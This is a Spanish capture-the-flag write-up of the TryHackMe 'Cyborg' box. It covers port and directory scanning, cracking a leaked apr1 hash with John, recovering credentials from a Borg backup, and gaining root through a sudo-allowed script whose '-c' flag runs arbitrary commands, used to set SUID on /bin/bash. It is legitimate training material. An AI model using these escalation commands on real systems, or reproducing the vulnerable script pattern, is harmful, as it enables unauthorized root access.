---
layout: single
title: Cyborg - TryHackMe
excerpt: " A box involving encrypted archives, source code analysis and more. "
date: 2023-02-10
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-cyborg/cyborg.jpeg
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - John
  - borg
  - sudoers
  - bash
  - code
---

A box involving encrypted archives, source code analysis and more.

# Summary
- IP: 10.10.84.132
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
	-  80 -> Apache httpd 2.4.18

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.84.132 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80 -sCV 10.10.84.132 -oN targeted
```

- Escaneo de directorios con gobuster:

```bash
$gobuster dir -u 10.10.84.132 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```


# Análisis de página web:

- En la página principal, no encontramos nada interesante.

- En el análisis de directorio hecho con gobuster, encontramos lo siguientes: "/admin" y "/etc" así que los analizamos.

- En "/admin" analizando el código fuente, encontramos un archivo "/admin/archive.tar" lo descargamos.

- En "/etc"nos encontramos una posible credencial:

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```


# Cracking de hash con John:

- Guardamos el hash en un archivo de texto "hash.txt"

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

- Ejecutamos john para descifrar la contraseña y obtenemos lo siguiente:

```bash
$john hash.txt -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

```
music_archive:squidward
```



# Uso de Borg para recuperar un repositorio:

**NOTA:** Descargar el binario de "borg" y contemplarlo en el PATH para poder realizar los siguientes pasos sin problema.


- Si descomprimimos el archivo "archive.tar" anteriormente descargado, nos encontramos con varios subdirectorios, entramos hasta llegar al "README", nos damos cuenta que se trata de un repositorio creado como backup cifrado haciendo uso de un programa denominado "borg", en el mismo "README" encontramos un link con la documentación de dicho programa, lo analizamos.

- En la sección de "usage" encontramos el comando que sirve para poder extraer o recuperar los datos de un repositorio cifrado con dicho programa:

```bash
$borg extract /path/to/repo::my-files
```

- El comando nos pide el directorio completo en el que se encuentra el repo que queremos descifrar y extraer, además del nombre de archivo, el cual ya habíamos obtenido uno potencial.

- Adecuamos el comando, en este caso, usando la información que hemos recolectado hasta ahora:

```bash
$borg extract /home/dante/Tryhackme/Cyborg/content/home/field/dev/final_archive::music_archive
```


- Vemos que se nos creó un directorio "home" el cual al entrar contiene el directorio "alex", al parecer se trata del home de un usuario potencial de la máquina, así que con un "tree" desglosamos todo lo que contienen los directorios y subdirectorios:

```bash
$tree
── alex
    ├── Desktop
    │   └── secret.txt
    ├── Documents
    │   └── note.txt
    ├── Downloads
    ├── Music
    ├── Pictures
    ├── Public
    ├── Templates
    └── Videos
```

- Leemos el archivo "note.txt" y vemos que hay una credencial para el usuario "alex" lo usamos y ganamos acceso al sistema por SSH.

```bash
$ssh alex@10.10.84.132
```

# ESCALANDO PRIVILEGIOS:


- Vemos permisos de sudoers y encontramos lo siguiente:

```bash
$sudo -l
```

```
User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

- Es decir, podemos ejecutar con sudo como cualquier usuario del sistema sin contraseña la script "backup.sh".

- Analizamos dicha script y vemos que hace por detrás:

```
$cat /etc/mp3backups/backup.sh
```

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

- Al final de la script vemos que con el comando "cmd" ejecuta lo que contiene la variable "command", buscamos en el código donde se manipula dicha variable y encontramos que dentro de un while, se le está asignando valor:

```bash
while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done
```

- Nos damos cuenta que la script admite una flag "-c" la cual guardará lo que le mandemos por teclado en la variable "command", entonces, con lo que hemos analizado en el punto anterior, podemos concluir que la script, mediante la flag "-c" permite la ejecución del comando que le pasemos, como podemos ejecutar la script como sudo, todo lo que se realice se hará como root, entonces aprovechamos para darle permiso SUID a la bash:

```bash
$sudo /etc/mp3backups/backup.sh -c "chmod u+s /bin/bash"
```

- Ahora ejecutamos la bash con privilegios y seremos root:

```bash
$bash -p
```

